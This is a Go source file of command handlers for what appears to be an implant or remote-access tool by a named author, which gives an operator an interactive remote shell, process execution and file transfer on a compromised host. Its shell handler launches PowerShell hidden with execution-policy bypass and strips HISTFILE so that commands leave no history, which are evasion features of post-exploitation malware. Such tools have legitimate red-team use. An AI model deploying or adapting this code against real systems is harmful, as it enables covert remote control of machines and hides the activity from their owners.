package main

/*
 * command.go
 * Command handlers
 * By J. Stuart McMurray
 * Created 20220327
 * Last Modified 20220412
 */

import (
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"sync"
	"text/tabwriter"
)

// CommandHandler is a function which handles a command.
type CommandHandler func(s Shell, args []string) error

// CommandHandlers holds the handlers for every command.
var CommandHandlers = map[string]struct {
	Handler CommandHandler
	Help    string /* Help text. */
}{
	"h":  {CommandHandlerNoOp, "This help"},
	"?":  {CommandHandlerNoOp, "This help"},
	"#":  {CommandHandlerNoOp, "Log a comment"},
	"q":  {CommandHandlerQuit, "Disconnect from the implant"},
	"cd": {CommandHandlerCD, "Change directory"},
	"u":  {CommandHandlerUpload, "Upload a file (iTerm2)"},
	"d":  {CommandHandlerDownload, "Download a file (iTerm2)"},
	"s":  {CommandHandlerShell, "Execute (a command in) a shell"},
	"r":  {CommandHandlerRun, "Run a new process and get its output"},
	"c":  {CommandHandlerCopy, "Copy a file to the pasteboard (iTerm2)"},
	"f":  {CommandHandlerFile, "Read/write a file"},
}

func init() {
	/* Avoid initialization loop. */
	for _, c := range []string{"h", "?"} {
		h := CommandHandlers[c]
		h.Handler = CommandHandlerHelp
		CommandHandlers[c] = h
	}
}

// CommandHandlerNoOp is a no-op, for # in CommandHandlers
func CommandHandlerNoOp(Shell, []string) error { return nil }

// CommandHandlerHelp prints the list of commands.
func CommandHandlerHelp(s Shell, args []string) error {
	/* Sorted list of commands. */
	cs := make([]string, 0, len(CommandHandlers))
	for c := range CommandHandlers {
		cs = append(cs, c)
	}
	sort.Strings(cs)

	/* Print a nice table. */
	tw := tabwriter.NewWriter(s, 2, 8, 2, ' ', 0)
	fmt.Fprintf(tw, "Command\tDescription\n")
	fmt.Fprintf(tw, "-------\t-----------\n")
	for _, c := range cs {
		fmt.Fprintf(tw, "%s\t%s\n", c, CommandHandlers[c].Help)
	}
	return tw.Flush()
}

// CommandHandlerQuit quits the shell
func CommandHandlerQuit(s Shell, args []string) error {
	s.Printf("Bye.\n")
	return ErrQuitShell
}

// CommandHandlerCD changes directories.
func CommandHandlerCD(s Shell, args []string) error {
	/* Need a directory to which to change. */
	if 1 != len(args) {
		s.Printf("Need a directory\n")
		return nil
	}

	/* Try to change directories. */
	if err := os.Chdir(args[0]); nil != err {
		s.Printf(
			"Unable to change directory to %s: %s\n",
			args[0],
			err,
		)
		return nil
	}

	/* Log the change. */
	wd, err := os.Getwd()
	if nil != err {
		s.Logf("Unable to get current directory: %s", err)
		wd = args[0] + " (requested)"
	}
	Logf("[%s] Changed directory to %s", s.Tag, wd)

	/* Tell all shells to update their prompt to the new directory. */
	AllShells(func(tag string, s Shell) {
		s.UpdatePrompt(true)
	}, false)
	return nil
}

// CommandHandlerShell either sends its args to the shell or, if args is empty,
// connects the user to a shell.
func CommandHandlerShell(s Shell, args []string) error {
	/* Get a platform-appropriate shell. */
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command(
			"powershell.exe",
			"-nop",
			"-windowstyle", "hidden",
			"-noni",
			"-ep", "bypass",
			"-command", "-",
		)
	default:
		cmd = exec.Command("/bin/sh")
	}

	/* Remove the HISTFILE environment variable. */
	env := os.Environ()
	last := 0
	for _, v := range env {
		if strings.HasPrefix(v, "HISTFILE=") {
			continue
		}
		env[last] = v
		last++
	}
	env = env[:last]
	cmd.Env = env

	/* Hook up the command as stdin if we have one.  If not, use the
	shell. */
	input := strings.Join(args, " ")
	var pw *io.PipeWriter
	if 0 != len(args) {
		cmd.Stdin = strings.NewReader(input)
	} else {
		var pr *io.PipeReader
		pr, pw = io.Pipe()
		cmd.Stdin = pr
	}

	/* Proxy the output ourselves so we can warn the user when the shell
	is dead. */
	op, err := cmd.StdoutPipe()
	if nil != err {
		s.Logf("Error getting stdout pipe: %s", err)
		return nil
	}
	ep, err := cmd.StderrPipe()
	if nil != err {
		s.Logf("Error getting stderr pipe: %s", err)
		return nil
	}
	ech := make(chan error, 2)
	for _, p := range []struct { /* Copy, and stick errors in ech. */
		n  string
		rc io.ReadCloser
	}{{"stderr", ep}, {"stdout", op}} {
		go func(n string, r io.ReadCloser) {
			if _, err := io.Copy(s, r); nil != err {
				ech <- fmt.Errorf("%s died: %w", n, err)
				return
			}
			ech <- nil
		}(p.n, p.rc)
	}

	/* If we're running a single command, life's easy. */
	if "" != input {
		Logf("[%s] Sending %q to %s", s.Tag, input, cmd.Path)
		if err := cmd.Run(); nil != err {
			s.Logf("Unclean exit: %s", err)
		}
		return nil
	}

	/* Start the shell. */
	if err := cmd.Start(); nil != err {
		s.Logf("Error starting interactive shell: %s", err)
		return nil
	}
	s.Logf("Starting interactive shell")
	s.Printf("Input is line-oriented, some things may not work.\n")
	s.Term.SetPrompt("shell> ")

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer pw.Close() /* EOF's need this. */
		for {
			/* Grab a line to send to the shell. */
			l, err := s.Term.ReadLine()
			if nil != err {
				s.Logf(
					"Error reading input for "+
						"interactive shell: %s",
					err,
				)
				return
			}
			if _, err := pw.Write([]byte(l + "\n")); nil != err {
				if !errors.Is(err, io.EOF) &&
					!errors.Is(err, io.ErrClosedPipe) {
					s.Logf(
						"Error sending input to "+
							"interactive shell: "+
							"%s",
						err,
					)
				}
				return
			} else {
				if "" != l {
					Logf("[%s] Shell input: %q", s.Tag, l)
				}
			}
		}
	}()

	/* Wait for shell to die. */
	go func() {
		if err := cmd.Wait(); nil != err {
			Logf(
				"[%s] Interactive shell ended with error: %s",
				s.Tag,
				err,
			)
		} else {
			Logf("[%s] Interactive shell ended", s.Tag)
		}
	}()

	/* Wait until both stdout and stderr die, then tell the user to hit
	return to get his shell back. */
	for i := 0; i < 2; i++ {
		err := <-ech
		if nil == err {
			continue
		}
		s.Logf("Shell output error: %s", err)
	}
	pw.Close()          /* Don't read more from the user. */
	if 0 == len(args) { /* Warn the user if we have one. */
		s.Printf(
			"Shell output died.  Hit enter once or twice.\n",
		)
	}

	s.UpdatePrompt(false)
	wg.Wait()
	return nil
}

// CommandHandlerRun runs a new process with the given argv.
func CommandHandlerRun(s Shell, args []string) error {
	/* Make sure we have something to run. */
	if 0 == len(args) {
		s.Printf("Need an argument vector\n")
		return nil
	}
	/* Roll a command to run. */
	cmd := exec.Command(args[0], args[1:]...)
	cmd.Stdout = s
	cmd.Stderr = s

	/* Gogogo! */
	s.Logf("Spawning new process with argv %q", args)
	if err := cmd.Run(); nil != err {
		s.Logf("Process terminated with error: %s", err)
		return nil
	}
	Logf("[%s] Process terminated", s.Tag)
	return nil
}

// CommandHandlerCopy uses iTerm2 to copy the contents of a file to the
// pasteboard.  This requires iTerm2.
func CommandHandlerCopy(s Shell, args []string) error {
	/* Make sure we have exactly one file. */
	if 1 != len(args) {
		s.Printf("Need exactly one file to copy\n")
		return nil
	}
	/* Open the file in question. */
	f, err := os.Open(args[0])
	if nil != err {
		s.Printf("Unable to open %s: %s", args[0], err)
	}
	defer f.Close()

	/* Tell the terminal we're about to send a file. */
	s.Printf("\x1b]1337;Copy=:")

	/* Send the file.  We don't report the error until we tell the terminal
	we're done. */
	enc := base64.NewEncoder(base64.StdEncoding, s)
	n, err := io.Copy(enc, f)
	enc.Close()

	/* Tell the terminal we're done. */
	s.Printf("\x07")

	/* Let the user and server know what happened. */
	if nil != err {
		s.Logf(
			"Error after copying %d bytes of %s: %s",
			n,
			f.Name(),
			err,
		)
		return nil
	}
	s.Logf("Copied %s", f.Name())
	return nil
}
